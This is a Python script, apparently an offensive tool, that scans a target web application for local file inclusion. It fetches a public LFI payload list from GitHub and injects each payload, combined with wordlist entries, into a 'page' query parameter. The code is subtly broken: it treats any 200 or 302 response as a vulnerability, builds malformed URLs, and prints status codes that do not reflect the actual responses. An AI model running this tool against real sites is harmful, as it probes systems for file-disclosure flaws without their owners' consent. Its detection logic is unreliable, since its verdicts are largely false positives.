import requests
import argparse

def test_vulnerability(url):
    response = requests.get(url, allow_redirects=False)
    status_code = response.status_code
    return status_code == 302 or status_code == 200

def download_payloads(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        return response.text.split("\n")
    except requests.exceptions.RequestException as e:
        print(f"Error downloading payloads: {e}")
        return []

def main():
    parser = argparse.ArgumentParser(description="LFI Vulnerability Scanner")
    parser.add_argument("-w", "--wordlist", required=True, help="Path to the wordlist file")
    parser.add_argument("-u", "--url", required=True, help="Base URL of the vulnerable application")
    args = parser.parse_args()

    payloads_url = "https://raw.githubusercontent.com/emadshanab/LFI-Payload-List/master/LFI%20payloads.txt"
    payloads = download_payloads(payloads_url)

    if not payloads:
        print("No payloads downloaded. Exiting.")
        return

    custom_dictionary = []
    with open(args.wordlist, "r") as wordlist_file:
        custom_dictionary = [line.strip() for line in wordlist_file]

    for word in custom_dictionary:
        for payload in payloads:
            full_url = f"{args.url}?page={word}={payload}"
            if test_vulnerability(full_url):
                status_code = "302" if test_vulnerability(full_url) else "200"
                print(f"Status: {status_code} - Vulnerable to LFI: {full_url}")
            else:
                status_code = "302" if test_vulnerability(full_url) else "200"
                print(f"Status: {status_code} - Not vulnerable to LFI: {full_url}")

if __name__ == "__main__":
    main()
